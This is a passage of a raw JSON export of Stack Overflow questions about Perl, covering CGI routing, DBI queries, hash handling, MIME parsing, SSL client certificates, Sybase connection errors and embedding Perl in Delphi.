$LastInUrl;\n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":10,"view_count":114,"score":-8,"question_id":12834509,"title":"Why perl is not considered as a language","body":"<p>I was watching a video lecture on introduction to programming, Perl was not listed under modern programming languages only Ruby and Python are listed. Why is this discrimination shown on Perl? </p>\n\n<p>I have faced the same thing (not listing Perl under programming languages category) on many websites also. But Python shows up a lot more why?</p>\n"},{"tags":["perl","function","return-type"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":170,"score":6,"question_id":12862326,"title":"Perl: function returns reference or copy?","body":"<p>Im a newbie in perl. So the question might sound something naive.</p>\n\n<p>I have two following functions</p>\n\n<pre><code>#This function will return the reference of the array\nsub getFruits1\n{\n    my @fruits = ('apple', 'orange', 'grape');\n    return \\@fruits;\n}\n</code></pre>\n\n<p>But in the following case?</p>\n\n<pre><code>#How it returns?\nsub getFruits2\n{\n    my @fruits = ('apple', 'orange', 'grape');\n    return @fruits;\n}\n</code></pre>\n\n<p>Will <code>getFruits2</code> return a reference and a new copy of that array will be created?</p>\n"},{"tags":["perl","search-and-replace"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":56,"score":-4,"question_id":12861244,"title":"Perl - search and replace single master file to create multiple daughter files","body":"<p>I have a Master file from which I want to create several daughter files.  The master file has several lines of text in it which I wish to alter and then save to another file.  I wish to do this multiple times, each time saving the new file to a different filename.</p>\n\n<p>For example my Master file has some REPLACETEXT which I wish to change to NEWTEXT and save the entire file into NEWTEXT1.txt. I then want to repeat this for NEWTEXT2 and save to NEWTEXT2.txt.  Again rinse and repeat another 100 or so times.</p>\n\n<p>I assume there is a quick way with perl and loops but it has defeated my limited knowledge.</p>\n"},{"tags":["perl","url","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12861846,"title":"How do I make a website run a perl CGI script without including the script name in the URL?","body":"<p>When a user goes to 'http://www.mydomain.com/' currently index.html is returned.  Instead, I would like to run a CGI script.  How do I do that?</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12860296,"title":"How to check for an empty set when using Perl DBI->MySQL","body":"<p>Is there a way to check if a DBI->execute statement returns an empty set? The purpose is that I want to create a table, and then ask for username, if the username isn't in the table, (check for empty fetch() statement), then add to table. Any suggestions?</p>\n\n<pre><code>    $sth = $dbh-&gt;prepare(\"SELECT * FROM table_name_here\");\n    $sth-&gt;execute();\n\n    if(...$sth-&gt;fetch() was empty...)\n    do something...\n</code></pre>\n"},{"tags":[".net","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12850066,"title":"Alternative way of using .Net in perl than Win32::OLE?","body":"<p>Is there a different alternative in Perl than using Win32::OLE to incorporate .Net dlls into Perl? I am completely new to Perl and don't really understand it much yet......</p>\n"},{"tags":["perl","url","cgi","url-routing","environment-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12860961,"title":"How do I pass an environment variable to a CGI script by simply placing its value immediately after the slash after the domain?","body":"<p>I would like to pass an environment variable to a cgi script written in perl by including it as the only text after the first slash after the domain name in the url.  For example, typically one might do this like so:  <code>http://www.mydomain.com/cgi-bin/my_perl_script.pl?my_environment_variable=12345</code>.  I would like it to look like this instead:  <code>http://wwww.mydomain.com/12345</code>.  How do I do that?  I would like persistent access to this value as the user navigates my site.  I would be happy to pass it around as a hidden form input, or write a cookie.  This is purely for aesthetic purposes and to make the urls easier to remember.</p>\n"},{"tags":["php","perl","cron","cgi","shellexecute"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":133,"score":-1,"question_id":12859726,"title":"GoDaddy Cron Job issue with Shell and Perl Script","body":"<p>i created a Cron Job on my GoDaddy Server, named \"SponUpdate.sh\" </p>\n\n<p>here is the code for this file </p>\n\n<pre><code>#!/bin/bash\n\n/usr/bin/perl /home/content/14/5959214/html/cgi/JLLoadSponFRJ.pl\n/usr/bin/perl /home/content/14/5959214/html/cgi/JLLoadSponMGJ.pl\n/usr/bin/perl /home/content/14/5959214/html/cgi/JLLoadSponCAD.pl\n/usr/bin/perl /home/content/14/5959214/html/cgi/JLLoadSponCJB.pl\n</code></pre>\n\n<p>Now the issue is when this cron Job Runs it says me following Error, </p>\n\n<p>\"/bin/sh: /var/chroot/home/content/14/5959214/html/cgi/SponUpdate.sh: /bin/bash: bad interpreter: Permission denied\"</p>\n\n<p>here is the code for one of Perl File  \"JLLoadSponFRJ.pl\"</p>\n\n<pre><code>my $command = '/web/cgi-bin/php5 -q $HOME/html/GISJobs/JLLoadSpon.php';\nexec ($command) or print STDERR \"couldn't exec $command: $!\";\n</code></pre>\n\n<p>i am unable to resolve it from last 3 days, </p>\n\n<p>Please help me, </p>\n\n<p>Thanks in advance, </p>\n\n<p>Regards,</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":417,"score":-1,"question_id":11198431,"title":"Installed Perl modules not available","body":"<p>On CentOS 6.2, perl v5.10.1 and I cannot install XML::SAX::Expat. Using \"cpan XML::SAX::Expat\"</p>\n\n<p>a lot of the earlier problems I solved (there were a lot more errors when I first tried to installl XML::Simple) came from missing binaries required by the cpan config (in my case: unzip, make, lynx, patch, gcc, ftp). Since this is the only module failing to install (all other prerequisites are already installed), I am under the impression that I already installed all the OS requirements (via yum). <strong>Am I correct to assume this?</strong></p>\n\n<p>BTW, the histfile doesnt get created. <strong>Which permissions should i apply to /root/.cpan/ ?</strong></p>\n\n<p><strong>What should I try next? Is it ok to force install?</strong></p>\n\n<pre><code>All tests successful.\nFiles=13, Tests=486, 12 wallclock secs ( 0.07 usr  0.01 sys +  1.84 cusr  0.07 csys =  1.99 CPU)\nResult: PASS\n  GRANTM/XML-Simple-2.20.tar.gz\nTests succeeded but one dependency not OK (XML::SAX::Expat)\n  GRANTM/XML-Simple-2.20.tar.gz\n  [dependencies] -- NA\nRunning make install\n  make test had returned bad status, won't install without force\nFailed during this command:\n TODDR/XML-Parser-2.41.tar.gz                 : make NO\n BJOERN/XML-SAX-Expat-0.40.tar.gz             : make_test NO\n GRANTM/XML-Simple-2.20.tar.gz                : make_test NO one dependency not OK (XML::SAX::Expat)\n</code></pre>\n\n<p>Output from cpan conf:</p>\n\n<blockquote>\n  <p>load_module_verbosity [v]</p>\n  \n  <p>lynx               [/usr/bin/lynx]</p>\n  \n  <p>make               [/usr/bin/make]</p>\n  \n  <p>make_arg           []</p>\n  \n  <p>make_install_arg   []</p>\n  \n  <p>make_install_make_command [/usr/bin/make]</p>\n  \n  <p>makepl_arg         [INSTALLDIRS=site]</p>\n  \n  <p>mbuild_arg         []</p>\n  \n  <p>mbuild_install_arg []</p>\n  \n  <p>mbuild_install_build_command [./Build]</p>\n  \n  <p>mbuildpl_arg       [--installdirs site]</p>\n  \n  <p>ncftp              []</p>\n  \n  <p>ncftpget           []</p>\n  \n  <p>no_proxy           []</p>\n  \n  <p>pager              [/usr/bin/less]</p>\n  \n  <p>password           undef</p>\n  \n  <p>patch              [/usr/bin/patch]</p>\n  \n  <p>patches_dir        undef</p>\n  \n  <p>perl5lib_verbosity [v]</p>\n  \n  <p>prefer_installer   [MB]</p>\n  \n  <p>prefs_dir          [/root/.cpan/prefs]</p>\n  \n  <p>prerequisites_policy [ask]</p>\n  \n  <p>proxy_pass         undef</p>\n  \n  <p>proxy_user         undef</p>\n  \n  <p>randomize_urllist  undef</p>\n  \n  <p>scan_cache         [atstart]</p>\n  \n  <p>shell              [/bin/bash]</p>\n  \n  <p>show_unparsable_versions [0]</p>\n  \n  <p>show_upload_date   [0]</p>\n  \n  <p>show_zero_versions [0]</p>\n  \n  <p>tar                [/bin/tar]</p>\n  \n  <p>tar_verbosity      [v]</p>\n  \n  <p>term_is_latin      [1]</p>\n  \n  <p>term_ornaments     [1]</p>\n  \n  <p>test_report        [0]</p>\n  \n  <p>trust_test_report_history [0]</p>\n  \n  <p>unzip              [/usr/bin/unzip]</p>\n  \n  <p>urllist</p>\n\n<pre><code>0 [ftp://cpan.pair.com/pub/CPAN/]\n\n1 [ftp://ftp-mirror.internap.com/pub/CPAN/]\n\n2 [ftp://cpan.cs.utah.edu/CPAN/]\n\n3 [ftp://mirror.atlantic.net/pub/CPAN/]\n\n4 [http://httpupdate19.cpanel.net/CPAN/]\n</code></pre>\n  \n  <p>use_sqlite         [0]</p>\n  \n  <p>username           undef</p>\n  \n  <p>wait_list          undef</p>\n  \n  <p>wget               [/usr/bin/wget]</p>\n  \n  <p>yaml_load_code     [0]</p>\n  \n  <p>yaml_module        [YAML]</p>\n</blockquote>\n"},{"tags":["perl","formatting"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3737,"score":2,"question_id":3328010,"title":"Best way to have a formatted output with perl","body":"<p>I want to output strings into 8 columns, but I want to keep the spacing the same. I dont want to do it in HTML, but I am not sure how to do it normally. Example: </p>\n\n<pre><code>Something    Something     Something     Something     Something \nElse         Else          Else          Else          Else\nAnother      Another       Another       Another       Another\n</code></pre>\n\n<p>The amount of rows will change daily but the column number will always stay the same. What is the best way to do this?</p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12592637,"title":"Is it possible to iterate  through a hash in sorted order using the while(my($key, $value) ... ) {} method?","body":"<p>For a hash of this format:</p>\n\n<pre><code>my $itemHash = {\n    tag1 =&gt; {\n        name =&gt; \"Item 1\",\n        order =&gt; 1,\n        enabled =&gt; 1,\n    },\n    tag2 =&gt; {\n        name =&gt; \"Item 2\",\n        order =&gt; 2,\n        enabled =&gt; 0,\n    },\n    tag3 =&gt; {\n        name =&gt; \"Item 3\",\n        order =&gt; 3,\n        enabled =&gt; 1,\n    },\n    ...\n}\n</code></pre>\n\n<p>I have this code that correctly iterates through the hash:</p>\n\n<pre><code>keys %$itemHash; # Resets the iterator\nwhile(my($tag, $item) = each %$itemHash) {\n    print \"$tag is $item-&gt;{'name'}\"\n}\n</code></pre>\n\n<p>However, the order that these items are iterated in seems to be pretty random. Is it possible to use the same <code>while</code> format to iterate through them in the order specified by the 'order' key in the hash for each item?</p>\n\n<p>(I know I can sort the keys first and then foreach loop through it. Just looking to see if there is cleaner way to do this.)</p>\n"},{"tags":["perl","filter","binary-data"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12854463,"title":"Filtering out binary data","body":"<p>Makes this subroutine sense, if I want find binary data?</p>\n\n<pre><code>sub is_binary_data {\n    my $data = shift;\n    return $data =~ /\\x00/;\n}\n</code></pre>\n"},{"tags":["perl","ssl","openssl","lwp","lwp-useragent"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":112,"score":3,"question_id":12697450,"title":"Using LWP with SSL and client certificates","body":"<p>I'm porting an application from PHP/cURL to Perl and LWP::UserAgent. I need to do a POST request to a web server and provide a client certificate and key file. The PHP code I'm trying to replicate is this:</p>\n\n<pre><code>curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); \ncurl_setopt($ch, CURLOPT_SSLCERT, \"/path/to/certificate.pem\"); \ncurl_setopt($ch, CURLOPT_SSLKEY, \"/path/to/private.key\"); \ncurl_setopt($ch, CURLOPT_SSLKEYPASSWD, \"secretpassword\");\n</code></pre>\n\n<p>And here's my Perl code:</p>\n\n<pre><code>my $ua = LWP::UserAgent-&gt;new();\n$ua-&gt;ssl_opts(\n   SSL_verify_mode =&gt; 0,\n   SSL_cert_file   =&gt; '/path/to/certificate.pem',\n   SSL_key_file    =&gt; \"/path/to/private.key\",\n   SSL_passwd_cb   =&gt; sub { return \"secretpassword\"; }  \n);\n</code></pre>\n\n<p>The PHP code successfully connects to the server but the Perl code fails with:</p>\n\n<p>SSL read error error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure</p>\n\n<p>I can't figure out what I'm missing.</p>\n"},{"tags":["perl","hash","higher-order-functions"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":999,"score":6,"question_id":5769348,"title":"map for hashes in Perl","body":"<p>Is there a hash equivalent for <code>map</code>?</p>\n\n<pre><code>my %new_hash = hash_map { new_key($a) =&gt; new_val($b) } %hash;\n</code></pre>\n\n<p>I know that I could loop through the keys.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12847739,"title":"MIME::Parser - Can't save binary attachment","body":"<p>I am using Perl to read messages, look for and save attachments. Attachments will always be binary pdf documents and there will never be more than one attachment. I need to read the subject, check for and save an attachment (if exists) an copy message to a folder for temporary storage.</p>\n\n<p>The reading, printing, copying functions all work. I've tried a lot of different scenarios with MIME::Parser (I have MIME::Tools installed) but either get a blank file or file with 1 or 2 characters. I'd also like to know how to determine / set the file extension rather than just blindly rename to .pdf.</p>\n\n<pre><code>#!/usr/bin/perl\n\n\nuse Net::IMAP::Simple::SSL;\nuse Email::Simple;\nuse MIME::Parser;\n\nprint \"Content-type: text/html\\n\\n\";\n\n$server = new Net::IMAP::Simple::SSL('xxx');\n$server-&gt;login('xxx','xxx');\n\nmy $folder='inbox';\n\nmy ($unseen, $recent, $total) = $server-&gt;status($folder);\nmy $newm = $server-&gt;select('INBOX');\n\nmy $tmp=($total-9); #limit for testing\n\nmy $outputdir = \"./temp\";\nmy $parser = new MIME::Parser;\n$parser-&gt;output_dir($outputdir);\n\n\nfor (my $i = $tmp; $i &lt;= $total; $i++) {\n\n        if ($server-&gt;seen($i)) {\n        print \"Message #$i has been seen before...&lt;br /&gt;\";\n        } else {\n\n        my $es=Email::Simple-&gt;new(join '', @{$server-&gt;top($i)});\n        print $es-&gt;header('Subject').\" on \";\n        print $es-&gt;header('Date').\"&lt;br /&gt;\";\n        print \"You've just seen message #$i&lt;br /&gt;\" if $server-&gt;see($i).\"&lt;br /&gt;\";\n        $msg = $server-&gt;get($i);\n        $parser-&gt;parse_data($msg);\n        $server-&gt;copy($i,'dump');\n\n        }\n\n    }\n\n $server-&gt;quit();\n\n exit;\n</code></pre>\n\n<p>Error</p>\n\n<blockquote>\n  <p>parse_data: wrong argument ref type: Net::IMAP::Simple::_message at mailextract.pl line x</p>\n</blockquote>\n"},{"tags":["perl","formatting"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":138,"score":0,"question_id":12834479,"title":"Perl Format the Output in nice way","body":"<p>I have written a perl code for processing file 'Output.txt' which has below Content.</p>\n\n<pre><code>  new.example.com 28\n  new.example.com 28\n  example.com 28\n  example.com 29\n  example.com 29\n  example.com 29\n  example.com 29\n  orginal.com 28\n  orginal.com 29\n  orginal.com 30\n  orginal.com 31\n  expand.com  31\n</code></pre>\n\n<p>And file 'domain.txt' has list of domain Names  which i need to match against File 'Output.txt'</p>\n\n<pre><code>new.example.com\nexample.com\norginal.com\ntest.com\nnew.com\n</code></pre>\n\n<p>I could manage to write PERL code like this </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nopen(LOGFILE,\"Output.txt\") or die(\"Could not open log file.\");\nmy $domain_name = 'domain.txt' ;\nopen(DOM, $domain_name);\nmy @r_contents = &lt;LOGFILE&gt;;\nclose(LOGFILE);    \nwhile(&lt;DOM&gt;) {\n    chomp;\n    my $line = $_;\n    my @lowercase = map { lc } @r_contents;\n    my @grepNames = grep  /^$line/, @lowercase;\n    foreach (@grepNames) {\n        if ( grep  /^$line/, @lowercase ) {\n            $domains{lc($_)}++ ;            }\n    }\n}\n\nclose(DOM) ;    \nforeach my $domain (sort keys %domains) {\n    my %seen ;\n    ($Dname, $WeekNum) = split(/\\s+/, $domain);\n    my @array1 = grep { ! $seen{ $_ }++ } $WeekNum;\n    push @array2, @array1;\n    my @array4 = \"$domains{$domain} $domain\" ;\n    push @matrix,@array4 ;\n}\n   printf \"%-10s %-25s %-25s\\n\", 'DoaminName', \"Week $array2[0]\" ,\"Week $array2[1]\",\"Week $array2[2]\";\n   print \" @matrix \\n\";\n</code></pre>\n\n<p>current Output looks like this.</p>\n\n<pre><code> DoaminName         Week 28        week29   week30  week 31\n 2 new.example.com 35\n 1 example.com 28\n 4 example.com 29\n 1 orginal.com 28\n 1 orginal.com 29\n 1 orginal.com 30\n 1 orginal.com 31\n</code></pre>\n\n<p>But i trying  re-write the perl code to print the output like this .Please help me to correct the code.</p>\n\n<pre><code>Domain/WeekNumber   Week28       Week29        Week30        Week31\nnew.example.com     2            No            No            No\nexample.com         1            4             NO            NO\norginal.com         1            1              1             1\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12849554,"title":"Looking for help to send queries to Postgres from Perl","body":"<p>I am trying to write a Perl script to bring up a Postgres client once and send several files through the client, captures the output separately for each file.</p>\n\n<p>If I do something like:</p>\n\n<pre><code>system (\"cat $query1.sql | psql -p 2070 super &amp;&gt; $HOME/Results1.txt\");\nsystem (\"cat $query2.sql | psql -p 2070 super &amp;&gt; $HOME/Results2.txt\");\n</code></pre>\n\n<p>then Perl will start up the client for each query.  As I'll be running hundreds and maybe thousands of queries I want to skip the overhead for starting up all but the first client.</p>\n\n<p>I think I should be able to bring up the Postgres client via Open2, but it hangs when I try.  I'm doing this on SUSE Linux machine with Perl 5.10.0.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>use IPC::Open2;\n\nuse IO::Handle;\n\nour $pid = open2(*CHILDOUT, *CHILDINT, '../installdir/bin/psql -p 2070 super');\nprint STDOUT $pid;\n\nprint CHILDINT \"cat $dumpR5KScript\";\nprint STDOUT 'Sent the commands';\n\n$output = &lt;CHILDOUT&gt;;\n\nclose(CHILDIN);\nclose(CHILDOUT);\n</code></pre>\n\n<p>It appears to be hanging with \"open2\" because I never see the pid.  </p>\n\n<p>Can someone point out what I am doing wrong so my call to open2 doesn't hang?</p>\n\n<p>And if anyone has advice on the larger issue of the best way of bringing up a Postgres client and running queries through it I would be grateful.</p>\n"},{"tags":["perl","slf4j"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12854844,"title":"Perl script to parse log file that is in slf4j format","body":"<p>I have a log file that is being written using a defined slf4j XML format.  Is there a way to write a script, feeding in the XML format file, and then parsing the messages contained within?</p>\n\n<p>Example output:</p>\n\n<pre><code>2012-10-11 16:53:25.895 [main] {} INFO  org.mortbay.log - jetty-6.1.11\n2012-10-11 16:53:26.097 [main] {} INFO  / - Initializing Spring root WebApplicationContext\n</code></pre>\n\n<p>I want to create an output file (like a csv) that would separate by the columns based on the definition in the XML:</p>\n\n<pre><code>&lt;encoder&gt;\n    &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] {%mdc} %-5level %logger{36} - %msg%n&lt;/pattern&gt;\n&lt;/encoder&gt;\n</code></pre>\n\n<p>Any help/pointers would be GREATLY appreciated!  </p>\n\n<p>Thank you!</p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":12848862,"title":"How to end a thread in perl","body":"<p>I am new to perl and i have a question about perl thread.</p>\n\n<p>I am trying to create a new thread to check if the running function is timed out, and my way of doing it is as below.</p>\n\n<p>Logic is \n1.create a new thread\n2.run the main function and see if it is timed out, if ture, kill it</p>\n\n<p>Sample code:</p>\n\n<pre><code>$exit_tread = false;      # a flag to make sure timeout thread will run\nmy $thr_timeout = threads-&gt;new( \\&amp;timeout );  \nexecute main function here;                \n\n$exit_thread = true       # set the flag to true to force thread ends\n$thr_timeout-&gt;join();      #wait for the timeout thread ends\n</code></pre>\n\n<p>Code of timeout function</p>\n\n<pre><code>sub timeout\n{\n\n$timeout = false;\nmy $start_time = time();\nwhile (!$exit_thread)\n{\n\n    sleep(1);                 \n    last if (main function is executed);\n\n    if (time() - $start_time &gt;= configured time )\n    {\n        logmsg \"process is killed as request timed out\";\n        _kill_remote_process();\n        $timeout = true;   \n        last;         \n    }\n}    \n}\n</code></pre>\n\n<p>now the code is running as i expected, but i am just not very clear if the code $exit_thread = true works because there is a \"last\" at the end of while loop.</p>\n\n<p>Can anybody give me a answer?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","inheritance","base","dbix-class","isa"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":68,"score":4,"question_id":12844633,"title":"DBIx and inheritance in Perl","body":"<p>I'm currently trying to implement the following scenario with DBIx:</p>\n\n<p>The table <strong>products</strong> contains \"general products\" and \"bundle products\" (bundle products are collections of general products):</p>\n\n<pre><code>package Product;\nuse base 'DBIx::Class::Core';\n__PACKAGE__-&gt;table(\"products\");\n__PACKAGE__-&gt;add_columns(\n  \"productId\",\n  { data_type =&gt; \"varchar\", is_nullable =&gt; 0, size =&gt; 10},\n  \"name\",\n  { data_type =&gt; \"varchar\", is_nullable =&gt; 1, size =&gt; 150},\n  \"type\",\n  {\n     data_type =&gt; \"enum\",\n     default_value =&gt; \"general\",\n     extra =&gt; {\n       list =&gt; [\"general\", \"bundle\"],\n     },\n     is_nullable =&gt; 0,\n  });\n</code></pre>\n\n<p>As you can see, wether the product is a <strong>general</strong> product or a <strong>bundle</strong> product is saved in the column <strong>type</strong>.</p>\n\n<p>Now I would like to encapsulate this information in the class identity: I would like to have following classes:</p>\n\n<ul>\n<li>Product (<code>type</code> does not matter)</li>\n<li>BundleProduct (<code>type</code> = 'bundle')</li>\n<li>GeneralProduct (<code>type</code> = 'general')</li>\n</ul>\n\n<p>I wrote:</p>\n\n<pre><code>package BundleProduct;\nuse base 'Product';\n\n__PACKAGE__-&gt;resultset_attributes({ where =&gt; { 'type' =&gt; 'bundle' } });\n1;\n</code></pre>\n\n<p>and</p>\n\n<pre><code>package GeneralProduct;\nuse base 'Product';\n\n__PACKAGE__-&gt;resultset_attributes({ where =&gt; { 'type' =&gt; 'general' } });\n1;\n</code></pre>\n\n<p>But when executing</p>\n\n<pre><code>my @allProducts = $schema-&gt;resultset('BundleProduct')-&gt;all;\n</code></pre>\n\n<p>all <strong>general</strong> products are fetched. Although the resulting objects are of instance <code>BundleProduct</code>, the generated SQL contains the WHERE-condition of the class <code>GeneralProduct</code> (<code>type</code> = 'general'). Even worse: If I try to fetch a <code>Product</code> (base class of <code>BundleProduct</code> and <code>GeneralProduct</code>) the condition <code>type</code> = 'general' is applied, too! It seems that the definition within <code>GeneralProduct</code> overwrites all other definitions.</p>\n\n<p>What is wrong with my design?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":112,"score":-1,"question_id":12849618,"title":"Replace whitespace with hyphen in Perl","body":"<p>I want to replace all whitespaces with a hyphen, but the spaces are replaced with <code>045</code> instead of <code>-</code>. The expression is:</p>\n\n<pre><code>s/ /-/g\n</code></pre>\n\n<p>The expression <code>s/ /_/g</code> (with an underscore instead) works so I am not sure why <code>i have apples</code> becomes </p>\n\n<pre><code>i,045have,045apples\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":51,"score":-3,"question_id":12853965,"title":"Total count list number using by perl script","body":"<p>I want calculate list of number in foreach by perscript, </p>\n\n<pre><code>my @error_list = (10, 10, 15);\n\nforeach my $key (@error_list){\n\n\n}\n</code></pre>\n\n<p>i need total value as some $var = 35; for print</p>\n\n<p>plase with example</p>\n"},{"tags":["perl","filesystems"],"answer_count":1,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":139,"score":6,"question_id":12815091,"title":"Is there still unpredictable behavior with glob() in perl?","body":"<p>I found this piece of wisdom in the PerlFaq quoted in a chat board from 2000. </p>\n\n<blockquote>\n  <p>Is there a leak/bug in glob()?</p>\n  \n  <p>Due to the current implementation on some operating systems, when you\n  use the glob() function or its angle-bracket alias in a scalar\n  context, you may cause a leak and/or unpredictable behavior. It's best\n  therefore to use glob() only in list context.</p>\n</blockquote>\n\n<p>I read that this problem was fixed in Perl 5.6 but later heard a report that it still occurs in 5.10.1</p>\n\n<p>Has anyone had any experience of recent problems and where would be the best place to find the definitive answer regarding this?</p>\n\n<p>[Later..] The latest PerlFAQ says: </p>\n\n<blockquote>\n  <p>5.18: Is there a leak/bug in glob()?</p>\n  \n  <p>(contributed by brian d foy)</p>\n  \n  <p>Starting with Perl 5.6.0, \"glob\" is implemented internally rather than\n  relying on an external resource. As such, memory issues with \"glob\"\n  aren't a problem in modern perls.</p>\n</blockquote>\n\n<p>=====</p>\n\n<p>Finally: The problem that was been reported was due to the misuse of glob by using it in a loop after it had already give all of the matched items. There was no problem with it.</p>\n"},{"tags":["ruby","regex","perl","vim","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":345,"score":1,"question_id":8852948,"title":"Dynamic scraping and parsing","body":"<p><strong>Original Question rephrased:</strong>  </p>\n\n<p>I know a good amount PHP, Js, CSS, OOP and have recently honed my regex skills by using the vim editor's netrw and elinks plugins to download a series of web pages (about a million lines) that were parsed and made ready for uploading into my website.  I work on a linux/ubuntu system, a localhost setup and this particular project is implementing the Concrete5 cms - which is written in PHP.  </p>\n\n<p>Seeing the benefits of scraping and parsing information, I would like to have my site dynamically perform this function, though on a much smaller scale; such as, enabling my new user to transfer their personal information from another website into mine - which will typically be under a secure connection (though not always) and password.  </p>\n\n<p><strong>Question:</strong> What is the best tool (scripting language) to use for this?  I do not know either Perl or Ruby but I believe either one of those would be a good choice. I have also heard AWK and SED.  I'm sure I can figure out HOW to do it once I begin studying the language.  I would really appreciate some experienced input on which language would be the best to begin investing my time into learning it.</p>\n\n<p>Thanks for your help. </p>\n"},{"tags":["perl","sybase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12276281,"title":"perl sybase connection error on x86pc-solaris","body":"<p>I have a Solaris system with x86 CPU, when I try to connect to sybase db with perl, i got the following error(the error was generated when I run the script in debug mode and step into function DBD::Sybase::db::_login at Sybase.pm in line 94)</p>\n\n<p><strong>ct_con_props(CS_PASSWORD) failed at /usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBD/Sybase.pm line 94.\n at /usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBD/Sybase.pm line 94\n        DBD::Sybase::dr::connect('DBI::dr=HASH(0x8613a5c)', 'server=server1', 'user1, 'password1', 'HASH(0x86b4e5c)') called at /usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBI.pm line 617\n        DBI::_<em>ANON</em>_/usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBI.pm:679 called at /usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBI.pm line 681\n        DBI::connect('DBI', 'DBI:Sybase:server=server1', 'user1, 'password1') called at ./test.pl line 28\nDBI::CODE(0x83fcdd4)(/usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBI.pm:618):\n618:                $user = '' if !defined $user;</strong></p>\n\n<p>from the message, it seems there is something wrong with the password? but I am sure the password was correct and the same code works very well on a Spark-solaris system, could anyone tell me what's wrong, or tell me how can I get into the function DBD::Sybase::db::_login($this, $server, $user, $auth, $attr)? looks like this function was in an .xs file, but I can not find where is it, and can not debug into it.</p>\n\n<p>if I run the script withtout debug, i got the following error</p>\n\n<p><strong>ct_con_props(CS_PASSWORD) failed at /usr/local/lib/perl5/site_perl/5.8.8/i86pc-solaris/DBD/Sybase.pm line 94.\nDBI connect('server=server1','user1â,...) failed: OpenClient message: LAYER = (1) ORIGIN = (4) SEVERITY = (6) NUMBER = (221)\nServer server1, database\nMessage String: ct__string_extended_encryption: user api layer: internal common library error: error string not available\n at ./test.pl line 28\nConnect failed at ./test.pl line 28.</strong></p>\n\n<p>here is the code of sub connect in Sybase.pm</p>\n\n<pre><code> sub connect {\n    my($drh, $dbase, $user, $auth, $attr) = @_;\n    my $ifile = '';\n    my $server = $dbase || $ENV{DSQUERY} || 'SYBASE';\n\n    my($this) = DBI::_new_dbh($drh, {\n        'Name'         =&gt; $server,\n        'Username'     =&gt; $user,\n        'CURRENT_USER' =&gt; $user,\n    });\n\n    DBD::Sybase::db::_login($this, $server, $user, $auth, $attr)\n        or return undef;\n\n    return $this;\n}\n</code></pre>\n"},{"tags":["perl","delphi"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":652,"score":1,"question_id":1418963,"title":"How do I add Perl scripting support to a Delphi application?","body":"<p><a href=\"http://search.cpan.org/~gmpassos/PLDelphi-0.02/PLDelphi.pm\" rel=\"nofollow\">PLDelphi is a Perl project hosted on CPAN</a>. I am currently working on a Delphi application and I am investigating the possibility of adding Perl scripting support and read about PLDelphi.</p>\n\n<p>Ideally, I'd like my application to not require Perl to be installed. PLDelphi claims to support this:</p>\n\n<blockquote>\n  <p>To use PLDelphi from your Delphi\n  application without need to install\n  Perl you will need this files in the\n  main diretory of your application:</p>\n  \n  <p>PLDelphi.dll     - The PLDelphi\n  library that loads the Perl\n  interpreter. PLDelphi.pm      - Perl\n  side of PLDelphi. Perl56.dll       -\n  The Perl library in case that you have\n  Perl built dynamic. PLDelphi_dll.pas -\n  PLDelphi classes and DLL wrapper.\n  lib/* - A Perl lib directory with basic .pm files (strict, warnings, 